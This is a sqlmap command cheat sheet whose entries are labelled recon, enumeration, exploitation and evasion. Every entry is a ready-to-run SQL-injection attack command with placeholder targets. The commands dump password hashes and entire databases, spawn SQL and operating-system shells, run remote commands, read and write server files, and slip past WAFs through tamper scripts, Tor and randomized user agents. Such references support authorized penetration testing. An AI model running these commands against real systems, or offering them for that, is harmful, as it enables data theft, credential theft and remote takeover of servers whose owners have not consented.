# [Recon] Quick test for SQL injection (GET) --sqlmap
sqlmap -u "<url>" --batch

# [Recon] Test a specific parameter --sqlmap
sqlmap -u "<url>" -p "<param>" --batch

# [Recon] Crawl target to discover injectable URLs --sqlmap
sqlmap -u "<url>" --crawl=<depth> --batch

# [Recon] Parse and test HTML forms on the page --sqlmap
sqlmap -u "<url>" --forms --batch

# [Recon] Force DBMS fingerprint detection --sqlmap
sqlmap -u "<url>" -f --batch

# [Recon] Identify WAF/IPS (heuristics) --sqlmap
sqlmap -u "<url>" --identify-waf --batch

# [Recon] Randomize User-Agent to reduce fingerprints --sqlmap
sqlmap -u "<url>" --random-agent --batch

# [Recon] Use a captured HTTP request file (e.g., from Burp) --sqlmap
sqlmap -r <request_file> --batch


# [Enumeration] Get DBMS banner --sqlmap
sqlmap -u "<url>" --banner --batch

# [Enumeration] Current user, DBA check, and privileges --sqlmap
sqlmap -u "<url>" --current-user --is-dba --privileges --batch

# [Enumeration] List database users --sqlmap
sqlmap -u "<url>" --users --batch

# [Enumeration] Dump password hashes for DB users --sqlmap
sqlmap -u "<url>" --passwords --batch

# [Enumeration] List all databases --sqlmap
sqlmap -u "<url>" --dbs --batch

# [Enumeration] List tables of a database --sqlmap
sqlmap -u "<url>" -D <database> --tables --batch

# [Enumeration] List columns of a table --sqlmap
sqlmap -u "<url>" -D <database> -T <table> --columns --batch

# [Enumeration] Current database --sqlmap
sqlmap -u "<url>" --current-db --batch


# [Exploitation] Dump selected columns from a table --sqlmap
sqlmap -u "<url>" -D <database> -T <table> -C <col1,col2,...> --dump --batch

# [Exploitation] Dump an entire table --sqlmap
sqlmap -u "<url>" -D <database> -T <table> --dump --batch

# [Exploitation] Dump a whole database --sqlmap
sqlmap -u "<url>" -D <database> --dump --batch

# [Exploitation] Dump everything (all DBs/tables) --sqlmap
sqlmap -u "<url>" --dump-all --batch

# [Exploitation] Spawn SQL shell --sqlmap
sqlmap -u "<url>" --sql-shell --batch

# [Exploitation] Spawn OS shell (if possible) --sqlmap
sqlmap -u "<url>" --os-shell --batch

# [Exploitation] Execute single OS command --sqlmap
sqlmap -u "<url>" --os-cmd="<command>" --batch

# [Exploitation] Read remote file via DBMS file read --sqlmap
sqlmap -u "<url>" --file-read="<remote_path>" --batch

# [Exploitation] Write local file to remote path (privs required) --sqlmap
sqlmap -u "<url>" --file-write="<local_path>" --file-dest="<remote_path>" --batch


# [Recon] Send POST data (application/x-www-form-urlencoded) --sqlmap
sqlmap -u "<url>" --data="<k1>=<v1>&<k2>=<v2>" --batch

# [Recon] JSON body (set header) --sqlmap
sqlmap -u "<url>" --data='<json_body>' -H "Content-Type: application/json" --batch

# [Recon] Test a specific POST parameter --sqlmap
sqlmap -u "<url>" --data="<k1>=<v1>&<k2>=<v2>" -p "<param>" --batch

# [Recon] Add cookies --sqlmap
sqlmap -u "<url>" --cookie="<k>=<v>; <k2>=<v2>" --batch

# [Recon] Add custom headers --sqlmap
sqlmap -u "<url>" -H "Authorization: Bearer <token>" -H "X-Forwarded-For: <ip>" --batch

# [OPSEC/Evasion] Use proxy (e.g., Burp at 127.0.0.1:8080) --sqlmap
sqlmap -u "<url>" --proxy="http://127.0.0.1:8080" --batch

# [OPSEC/Evasion] Use Tor SOCKS5 (ensure Tor is running) --sqlmap
sqlmap -u "<url>" --tor --tor-type=socks5 --tor-port=<9050> --batch

# [OPSEC/Evasion] Use HTTP Basic auth --sqlmap
sqlmap -u "<url>" --auth-type=Basic --auth-cred="<user>:<pass>" --batch

# [OPSEC/Evasion] Force HTTPS (ignore mixed-content issues) --sqlmap
sqlmap -u "<url>" --force-ssl --batch


# [OPSEC/Evasion] Increase threads for speed (noisy) --sqlmap
sqlmap -u "<url>" --threads=<n> --batch

# [OPSEC/Evasion] Increase test intensity (risk/level) --sqlmap
sqlmap -u "<url>" --risk=<1|2|3> --level=<1..5> --batch

# [OPSEC/Evasion] Delay between requests (ms/s) --sqlmap
sqlmap -u "<url>" --delay=<0.5> --batch

# [OPSEC/Evasion] HTTP timeout & retries --sqlmap
sqlmap -u "<url>" --timeout=<10> --retries=<3> --batch

# [Recon] Flush previous session data --sqlmap
sqlmap -u "<url>" --flush-session --batch

# [Recon] Force fresh detection queries --sqlmap
sqlmap -u "<url>" --fresh-queries --batch


# [Recon] Restrict techniques to Boolean-based --sqlmap
sqlmap -u "<url>" --technique=B --batch

# [Recon] Restrict to UNION-based --sqlmap
sqlmap -u "<url>" --technique=U --batch

# [Recon] Restrict to Time-based blind --sqlmap
sqlmap -u "<url>" --technique=T --time-sec=<5> --batch

# [Recon] Force specific DBMS if known --sqlmap
sqlmap -u "<url>" --dbms="<MySQL|PostgreSQL|MSSQL|Oracle|SQLite>" --batch

# [Recon] Positive/negative match strings (stabilize detection) --sqlmap
sqlmap -u "<url>" --string="<true_indicator>" --not-string="<false_indicator>" --batch


# [OPSEC/Evasion] Tamper using one or more scripts --sqlmap
sqlmap -u "<url>" --tamper="<tamper1,tamper2,...>" --batch

# [OPSEC/Evasion] Common tamper chain (randomcase + space2comment) --sqlmap
sqlmap -u "<url>" --tamper="randomcase,space2comment" --batch

# [OPSEC/Evasion] URL-encode payloads where needed --sqlmap
sqlmap -u "<url>" --tamper="urlencode" --batch


# [Recon] Load multiple target URLs from a file --sqlmap
sqlmap -m <targets_file> --batch

# [Recon] Scope-only testing via regex --sqlmap
sqlmap -u "<url>" --scope="<regex>" --batch


# [Post-Exploitation] Save output to a specific directory --sqlmap
sqlmap -u "<url>" --output-dir="<dir>" --batch

# [Post-Exploitation] Choose dump format (CSV/SQL/TXT) --sqlmap
sqlmap -u "<url>" --dump-format="<CSV|SQL|TXT>" --dump --batch


# [Workflow] Crawl then test discovered parameters --sqlmap
sqlmap -u "<url>" --crawl=<depth> --forms --batch

# [Workflow] Aggressive verify on a single parameter --sqlmap
sqlmap -u "<url>" -p "<param>" --level=5 --risk=3 --technique=BEUSTQ --threads=<n> --batch

# [Workflow] From captured request with tamper + proxy --sqlmap
sqlmap -r <request_file> --tamper="<tamper_chain>" --proxy="http://127.0.0.1:8080" --batch

